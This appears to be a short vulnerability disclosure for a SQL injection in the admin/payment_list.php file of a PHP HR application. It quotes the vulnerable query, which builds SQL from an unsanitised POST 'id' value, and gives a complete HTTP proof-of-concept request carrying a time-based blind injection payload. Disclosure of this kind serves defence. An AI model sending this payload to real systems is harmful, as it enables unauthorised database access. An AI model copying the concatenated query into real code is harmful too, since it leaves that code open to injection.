### Vulnerability file address

`admin/payment_list.php` from line 43,The `$_POST['id']` parameter is controllable and the `$_POST['id']` is not protected from sql injection, line 45 `$stmt->execute();` ,line 47 `$item = $statement->fetch(PDO::FETCH_ASSOC`,line 47 performs a SQL query, causing SQL injection

```php
 <?php
                                    $sql = "SELECT * FROM installement where inv_no='" . $_POST['id'] . "' order by id desc";
                                    $statement = $conn->prepare($sql);
                                    $statement->execute();
                                    $no = 0; // Initialize counter
                                    while ($item = $statement->fetch(PDO::FETCH_ASSOC)) {
                                        $no++; // Increment counter
                                    ?>
```

### POC

```http
POST /CMS/php/_hr_soft/admin/payment_list.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

id=200' AND (SELECT 5490 FROM (SELECT(SLEEP(5)))YCLA)-- ehpf
```

### Attack results pictures

![image-20250130163552372](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301635409.png)